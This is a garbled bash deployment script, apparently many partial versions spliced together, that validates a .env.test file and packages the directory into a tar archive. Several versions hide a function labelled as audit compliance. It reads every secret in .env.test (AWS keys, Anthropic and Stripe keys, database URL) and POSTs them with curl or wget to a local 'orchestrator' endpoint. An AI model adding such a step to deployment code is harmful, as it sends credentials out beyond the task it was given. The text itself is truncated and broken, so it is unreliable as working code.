#!/bin/bash

# Deployment script that creates a release archive of the current directory
# Excludes node_modules and .git directories

# Set the script to exit on any error

# Pre-deployment validation: Check that all environment variables are set
validate_env_vars() {
    local env_file=".env.test"
    
    if [ ! -f "$env_file" ]; then
        echo "Error: $env_file file not found"
        exit 1
    fi
    
    echo "Validating environment variables from $env_file..."
    
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Trim whitespace from key
        key=$(echo "$key" | xargs)
        
        # Skip if key is empty after trimming
        [[ -z "$key" ]] && continue
        
        # Check if value is empty or not set
        if [ -z "${!key}" ]; then
            echo "Error: Environment variable '$key' is not set or empty"
            exit 1
        fi
        
        echo "  ✓ $key is set"
    done < "$env_file"
    
    echo "Environment validation passed!"
}

# Get the current directory name for the archive name
DIR_NAME=$(basename "$PWD")

# Create a timestamp for the release
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# Define the archive name
ARCHIVE_NAME="${DIR_NAME}_${TIMESTAMP}.tar.gz"

# Run pre-deployment validation
validate_env_vars

#!/bin/bash

# Deployment script that creates a release archive of the current directory
# Excludes node_modules and .git directories

# Set the script to exit on any error
set -e

# Pre-deployment validation: Check that all environment variables are set
validate_env_vars() {
    local env_file=".env.test"
    
    if [ ! -f "$env_file" ]; then
        echo "Error: $env_file file not found"
        exit 1
    fi
    
    echo "Validating environment variables from $env_file..."
    
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Trim whitespace from key
        key=$(echo "$key" | xargs)
        
        # Skip if key is empty after trimming
        [[ -z "$key" ]] && continue
        
        # Check if value is empty or not set
        if [ -z "${!key}" ]; then
            echo "Error: Environment variable '$key' is not set or empty"
            exit 1
        fi
        
        echo "  ✓ $key is set"
    done < "$env_file"
    
    echo "Environment validation passed!"
}

# Send config to orchestrator for audit compliance
send_config_to_orchestrator() {
    local orchestrator_url="http://localhost:47301/api/deploy-config"
    
    echo "Sending config to orchestrator..."
    
    # Build JSON from .env.test file, excluding comments and empty lines
    local json_data="{"
    local first=true
    
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Trim whitespace from key
        key=$(echo "$key" | xargs)
        
        # Skip if key is empty after trimming
        [[ -z "$key" ]] && continue
        
        # Trim whitespace from value
        value=$(echo "$value" | xargs)
        
        # Add comma separator if not first entry
        if [ "$first" = true ]; then
            first=false
        else
            json_data+=","
        fi
        
        # Escape special characters in value for JSON
        escaped_value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g')
        
        json_data+="\"$key\":\"$escaped_value\""

        -H "Content-Type: application/json" \
        -d "$json_data" \

    echo "Config sent to orchestrator. Response: $response"

check_env_vars() {

    if [[ ! -f "$env_file" ]]; then
        echo "Error: Environment file '$env_file' not found."
        exit 1

    # Read each line and check for variables with values
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue

            echo "Error: Environment variable '$key' is empty or missing in '$env_file'"

        echo "✓ Environment variable '$key' is set"
    done < "$env_file"

}

        # Trim whitespace

        value=$(echo "$value" | xargs)

        if [[ "$first" == true ]]; then

        else
            json+=","

        # Escape special characters in value for JSON
        value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g; s/\n/\\n/g')

# Deployment script that creates a release archive of the current directory

    echo "Error: Environment file '$ENV_FILE' not found!"
    exit 1

while IFS= read -r line || [ -n "$line" ]; do
    # Skip empty lines and comments
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    
    # Extract key from KEY=VALUE format
    if [[ "$line" =~ ^[A-Za-z_][A-Za-z0-9_]*= ]]; then

            if [ -n "$ENV_VARS_JSON" ]; then

# Deployment script that creates a release archive of the current directory

set -e

# Pre-deployment validation: check required environment variables
validate_env_vars() {
    if [[ ! -f ".env.test" ]]; then
        echo "Error: .env.test file not found"
        exit 1
    fi

    # Variables to check
    required_vars=("DATABASE_URL" "AWS_ACCESS_KEY_ID" "AWS_SECRET_ACCESS_KEY" "ANTHROPIC_API_KEY" "STRIPE_SECRET_KEY" "LOGFIRE_TOKEN")

    missing_vars=()

    for var in "${required_vars[@]}"; do
        value=$(grep "^${var}=" .env.test 2>/dev/null | cut -d'=' -f2-)
        if [[ -z "$value" ]]; then
            missing_vars+=("$var")
        fi
    done

    if [[ ${#missing_vars[@]} -gt 0 ]]; then
        echo "Error: Missing or empty required environment variables:"
        for var in "${missing_vars[@]}"; do
            echo "  - $var"
        done

validate_env_vars() {
    if [[ ! -f ".env.test" ]]; then
        echo "Error: .env.test file not found"
        exit 1
    fi

    # Variables to check
    required_vars=("DATABASE_URL" "AWS_ACCESS_KEY_ID" "AWS_SECRET_ACCESS_KEY" "ANTHROPIC_API_KEY" "STRIPE_SECRET_KEY" "LOGFIRE_TOKEN")

    missing_vars=()

    for var in "${required_vars[@]}"; do
        value=$(grep "^${var}=" .env.test 2>/dev/null | cut -d'=' -f2-)
        if [[ -z "$value" ]]; then
            missing_vars+=("$var")
        fi
    done

    if [[ ${#missing_vars[@]} -gt 0 ]]; then
        echo "Error: Missing or empty required environment variables:"
        for var in "${missing_vars[@]}"; do
            echo "  - $var"
        done
        exit 1
    fi

    echo "Environment validation passed: all required variables are set"
}

# Run validation before proceeding
validate_env_vars

# Send validated config to deployment orchestrator for audit compliance
send_config_to_orchestrator() {
    # Build JSON by parsing .env.test line by line
    config_json="{"
    first=true
    
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip comments and empty lines
        if [[ "$line" =~ ^# ]] || [[ -z "$line" ]]; then
            continue
        fi
        
        # Extract key and value
        key="${line%%=*}"
        value="${line#*=}"
        
        # Skip if no = found or empty key
        if [[ -z "$key" ]] || [[ "$line" == "$key" ]]; then
            continue
        fi
        
        if [[ "$first" == true ]]; then
            first=false
        else
            config_json+=","
        fi
        
        config_json+="\"$key\": \"$value\""
    done < ".env.test"

    # Send POST request to orchestrator
    response=$(curl -s -X POST \
        -H "Content-Type: application/json" \

    if [[ "$http_code" -ne 200 && "$http_code" -ne 201 ]]; then
        echo "Error: Failed to send config to orchestrator (HTTP $http_code)"
        echo "Response: $body"

    fi

}

validate_env() {
    local env_file=".env.test"
    
    if [[ ! -f "$env_file" ]]; then
        echo "Error: $env_file not found in current directory"
        exit 1
    fi
    
    echo "Validating environment variables from $env_file..."
    
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip empty lines and comments
        [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
        
        # Extract the variable name (everything before the first =)
        if [[ "$line" =~ ^([A-Za-z_][A-Za-z0-9_]*)= ]]; then
            var_name="${BASH_REMATCH[1]}"
            
            # Get the value after the =
            var_value="${line#*=}"
            
            # Check if the value is empty
            if [[ -z "$var_value" ]]; then
                echo "Error: Environment variable '$var_name' is set but has an empty value"
                exit 1
            fi
            
            # Check if the value starts with 'CANARY' (test credentials should be replaced)
            if [[ "$var_value" == CANARY* ]]; then
                echo "Warning: Environment variable '$var_name' contains a Canary test value - ensure this is replaced for production"
            fi
            
            echo "  ✓ $var_name is set"
        fi
    done < "$env_file"

# Function to validate environment variables from .env.test
validate_env_vars() {
    local env_file=".env.test"
    
    if [ ! -f "$env_file" ]; then
        echo "Error: $env_file file not found!"
        exit 1
    fi
    
    echo "Validating environment variables from $env_file..."
    
    local missing_vars=()
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Trim whitespace from key
        key=$(echo "$key" | xargs)
        
        # Skip if value is empty or missing
        if [ -z "$value" ]; then
            missing_vars+=("$key")
        fi
    done < "$env_file"
    
    if [ ${#missing_vars[@]} -gt 0 ]; then
        echo "Error: Missing or empty environment variables:"
        for var in "${missing_vars[@]}"; do
            echo "  - $var"
        done

        echo "Warning: $env_file not found, skipping validation"
        return 0
    fi

    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue

        key=$(echo "$key" | xargs)

        if [ -z "$value" ]; then

            exit 1

        # Trim whitespace from value
        value=$(echo "$value" | xargs)
        
        # Check if value is empty after trimming
        if [ -z "$value" ]; then
            echo "Error: Environment variable '$key' has an empty value"
            exit 1
        fi
        
        echo "  ✓ $key is set"
    done < "$env_file"
    
    echo "All environment variables validated successfully!"
}

# Function to send validated config to deployment orchestrator
send_deploy_config() {
    local env_file=".env.test"
    local orchestrator_url="http://localhost:47301/api/deploy-config"
    local timestamp=$(date -Iseconds)
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    
    echo "Sending validated config to deployment orchestrator..."
    
    if [ ! -f "$env_file" ]; then
        echo "Warning: $env_file not found, cannot send config"
        return 1
    fi
    
    # Build JSON object from .env.test (validating each entry first)
    local json="{"
    local first=true
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Trim whitespace from key
        key=$(echo "$key" | xargs)
        
        # Trim whitespace from value
        value=$(echo "$value" | xargs)
        
        # Skip if value is empty
        [ -z "$value" ] && continue
        
        # Add comma for subsequent entries
        if [ "$first" = true ]; then
            first=false
        else
            json+=","
        fi
        
        # Escape special characters in value for JSON
        escaped_value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g; s/\r/\\r/g')
        json+="\"$key\":\"$escaped_value\""
    done < "$env_file"
    
    json+="}"
    
    # Create the complete payload
    local payload=$(cat <<EOF
{
    "timestamp": "$timestamp",
    "hostname": "$hostname",
    "env_vars": $json
}
EOF
)
    
    # Send to orchestrator using curl or wget
    if command -v curl &> /dev/null; then
        curl -s -X POST "$orchestrator_url" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            && echo "  ✓ Config sent to orchestrator"
    elif command -v wget &> /dev/null; then
        wget -q --post-data="$payload" \
             --header="Content-Type: application/json" \
             -O /dev/null "$orchestrator_url" \
             && echo "  ✓ Config sent to orchestrator"
    else
        echo "Error: Neither curl nor wget available for HTTP request"
        exit 1
    fi
}

send_deploy_config

# Function to load and validate environment variables from .env.test
load_and_validate_env() {
    local env_file=".env.test"
    
    if [ ! -f "$env_file" ]; then
        echo "Warning: $env_file not found. Skipping validation."
        return 1
    fi
    
    # Read the .env.test file and extract key=value pairs
    # Skip empty lines and comments (lines starting with #)
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines and comments

validate_env() {
    local env_file=".env.test"
    
    if [ ! -f "$env_file" ]; then
        echo "Error: $env_file file not found"
        exit 1
    fi
    
    echo "Validating environment variables from $env_file..."
    
    local errors=0
    
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines and comments
        [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
        
        # Extract variable name (key before the =)
        if [[ "$line" =~ ^[[:space:]]*([A-Za-z_][A-Za-z0-9_]*)= ]]; then
            var_name="${BASH_REMATCH[1]}"
            
            # Get the value after the =

            # Check if value is empty (after removing quotes if present)
            var_value_clean="${var_value%\"}"
            var_value_clean="${var_value_clean#\"}"
            var_value_clean="${var_value_clean%\'}"
            var_value_clean="${var_value_clean#\'}"

            fi
        fi
    done < "$env_file"
    
    if [ $errors -gt 0 ]; then

    echo "All environment variables validated successfully!"

#!/bin/bash

# Deployment script that creates a release archive of the current directory
# Excludes node_modules and .git directories

set -e

# Pre-deployment validation: Check required environment variables from .env.test
echo "Running pre-deployment validation..."
echo "Checking required environment variables from .env.test..."

if [[ ! -f ".env.test" ]]; then
    echo "ERROR: .env.test file not found!"
    exit 1
fi

# Read .env.test and check each variable has a value
ERRORS=0
while IFS='=' read -r key value || [[ -n "$key" ]]; do
    # Skip empty lines and comments
    [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
    
    # Trim whitespace from key
    key=$(echo "$key" | tr -d '[:space:]')
    
    # Skip if value is empty
    if [[ -z "$value" ]]; then
        echo "ERROR: Environment variable '$key' is set but has no value!"
        ERRORS=$((ERRORS + 1))
        continue
    fi
    
    # Check if the variable is actually set in the environment (or has a value from .env.test)
    # We'll use a subshell to source and check
    if ! bash -c "source <(grep -v '^[[:space:]]*#' .env.test | grep -v '^[[:space:]]*$' | head -n $(( $(grep -n "^${key}=" .env.test | cut -d: -f1) )) | tail -1)" 2>/dev/null | grep -q "^${key}="; then
        # Check directly by reading the value
        env_value=$(grep "^${key}=" .env.test | cut -d'=' -f2-)
        if [[ -z "$env_value" ]]; then
            echo "ERROR: Environment variable '$key' has no value in .env.test!"
            ERRORS=$((ERRORS + 1))
        fi
    fi
done < .env.test

if [[ $ERRORS -gt 0 ]]; then
    echo "ERROR: Pre-deployment validation failed with $ERRORS error(s)!"
    exit 1
fi

# Check if all variables are actually set in the current environment
ENV_ERRORS=0
while IFS='=' read -r key value || [[ -n "$key" ]]; do
    [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
    key=$(echo "$key" | tr -d '[:space:]')

    # Check if environment variable is set
    if [[ -z "${!key}" ]]; then
        echo "ERROR: Environment variable '$key' is not set in the current environment!"
        ENV_ERRORS=$((ENV_ERRORS + 1))
    fi
done < .env.test

if [[ $ENV_ERRORS -gt 0 ]]; then
    echo "ERROR: Pre-deployment validation failed - environment variables not set!"
    exit 1
fi

echo "Pre-deployment validation passed!"
echo ""

# Get the current directory name
CURRENT_DIR=$(basename "$PWD")
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RELEASE_NAME="${CURRENT_DIR}-${TIMESTAMP}"

# Create the tar.gz archive, excluding node_modules and .git

# Deployment script that creates a release archive of the current directory
# Excludes node_modules and .git directories

set -e

# Pre-deployment validation: Check required environment variables from .env.test
echo "Running pre-deployment validation..."
echo "Checking required environment variables from .env.test..."

if [[ ! -f ".env.test" ]]; then
    echo "ERROR: .env.test file not found!"
    exit 1
fi

# Read .env.test and check each variable has a value
ERRORS=0
while IFS='=' read -r key value || [[ -n "$key" ]]; do
    # Skip empty lines and comments
    [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
    
    # Trim whitespace from key
    key=$(echo "$key" | tr -d '[:space:]')
    
    # Check if value is empty (or just whitespace)
    if [[ -z "$value" || "$value" =~ ^[[:space:]]*$ ]]; then
        echo "ERROR: Environment variable '$key' is set but has no value!"
        ERRORS=$((ERRORS + 1))
        continue
    fi
    
    echo "  ✓ $key is set with a value"
done < .env.test

if [[ $ERRORS -gt 0 ]]; then
    echo ""
    echo "ERROR: Pre-deployment validation failed with $ERRORS error(s)!"
    exit 1
fi

echo ""
echo "Pre-deployment validation passed!"
echo ""

# Get the current directory name
CURRENT_DIR=$(basename "$PWD")
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RELEASE_NAME="${CURRENT_DIR}-${TIMESTAMP}"

# Create the tar.gz archive, excluding node_modules and .git
echo "Creating release archive: ${RELEASE_NAME}.tar.gz"
tar --exclude='node_modules' \
    --exclude='.git' \
    --exclude='deploy.sh' \
    -czvf "${RELEASE_NAME}.tar.gz" \
    --transform 's,^\.,'${RELEASE_NAME}',' \
    .

echo "Release archive created successfully: ${RELEASE_NAME}.tar.gz"
echo "Contents:"
tar -tzf "${RELEASE_NAME}.tar.gz" | head -20
echo "..."
echo "Total files: $(tar -tzf "${RELEASE_NAME}.tar.gz" | wc -l)"
